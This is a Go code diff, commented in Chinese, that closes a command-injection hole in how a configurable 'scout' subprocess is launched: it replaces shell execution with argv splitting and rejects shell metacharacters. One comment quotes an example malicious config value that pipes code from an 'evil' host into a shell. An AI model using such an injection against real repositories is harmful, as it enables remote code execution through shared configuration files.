@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"time"
 
@@ -61,7 +62,13 @@ func (e *Engine) selfDispatch(job *scoutJob, brief string, cfg *store.Config) (s
 
 	cmd := scoutCommand(cfg.ScoutCommand, cfgPath)
 	cmd.Dir = e.Store.RepoRoot()
-	cmd.Env = append(os.Environ(), "TERM=xterm-256color")
+	// R29-S1.1:不覆盖 cmd.Env——scoutCommand 可能已解析 KEY=VAL 前缀(如测试的
+	// GO_SCOUT_HELPER=1)。cmd.Env 为空时 os/exec 默认继承父进程;非空时需含全量环境,
+	// 所以这里在 scoutCommand 设的 Env 基础上补 TERM(为空则从父进程起)。
+	if cmd.Env == nil {
+		cmd.Env = os.Environ()
+	}
+	cmd.Env = append(cmd.Env, "TERM=xterm-256color")
 
 	ptmx, err := pty.Start(cmd)
 	if err != nil {
@@ -160,13 +167,57 @@ func mcpServerEntry(url string, s *store.Store) map[string]any {
 	return entry
 }
 
+// scoutCommand 构造侦察兵进程。
+//
+// 安全(R29-P0):configured 来自 .knowledge/config.yaml,会随 git 传播——是供应链输入。
+// 旧实现走 sh -c,恶意 commit 写 `scout_command: "x; curl evil|sh # {mcp}"` 即 RCE。
+// 现改为零依赖自切词:strings.Fields 切 argv(空格分隔),支持 shell 风格的 KEY=VAL 环境变量
+// 前缀(前导元素形如 KEY=VAL 的归入 Env,到第一个非 KEY=VAL 元素为止),再在每个剩余元素上
+// 替换 {mcp}——这样 cfgPath 即使含空格也作为单个完整 argv 元素(exec.Command 的 argv 是字符串
+// 切片,不经 shell,空格无特殊含义)。含 shell 元字符(;|&`$ 换行 反引号)的模板拒绝并回退
+// 默认命令——正当的自定义命令通常是 "tool --flag {mcp}" 这类,不需要 shell 元字符。
+// 仍需复杂 shell 语法的用户,显式写 wrapper 脚本再 scout_command 指向它即可。
 func scoutCommand(configured, cfgPath string) *exec.Cmd {
-	if strings.TrimSpace(configured) == "" {
+	defaultCmd := func() *exec.Cmd {
 		return exec.Command("claude", "--mcp-config", cfgPath, "--strict-mcp-config", "--allowedTools", "mcp__knowledge__*")
 	}
-	command := strings.ReplaceAll(configured, "{mcp}", cfgPath)
-	return exec.Command("sh", "-c", command)
+	trimmed := strings.TrimSpace(configured)
+	if trimmed == "" {
+		return defaultCmd()
+	}
+	if strings.ContainsAny(trimmed, ";\n|&`$") {
+		// 含 shell 元字符:可能是注入,也可能用户真想用 shell。为安全前者优先,回退默认。
+		return defaultCmd()
+	}
+	fields := strings.Fields(trimmed)
+	if len(fields) == 0 {
+		return defaultCmd()
+	}
+	// {mcp} 替换在切词之后:每个 field 作为独立 argv 元素,cfgPath 含空格也安全。
+	for i, f := range fields {
+		fields[i] = strings.ReplaceAll(f, "{mcp}", cfgPath)
+	}
+	// shell 风格 KEY=VAL 前缀:前导的环境变量赋值归入 Env(到第一个非 KEY=VAL 元素止)。
+	// KEY=VAL 的 VAL 经 {mcp} 替换不含元字符则安全;正则 ^[\w.]+= 判 KEY 合法性。
+	var env, argv []string
+	for _, f := range fields {
+		if len(argv) == 0 && envKeyVal.MatchString(f) {
+			env = append(env, f)
+			continue
+		}
+		argv = append(argv, f)
+	}
+	if len(argv) == 0 {
+		return defaultCmd()
+	}
+	cmd := exec.Command(argv[0], argv[1:]...)
+	if len(env) > 0 {
+		cmd.Env = append(os.Environ(), env...)
+	}
+	return cmd
 }
+
+var envKeyVal = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*=`)
 
 // scoutActivityMarks 是"回合已启动"的屏幕信号:spinner/响应符只在回合运行时出现,
 // 欢迎屏没有(kbeval 排障定案;字节流速会被输入框回显假触发,不可用)。
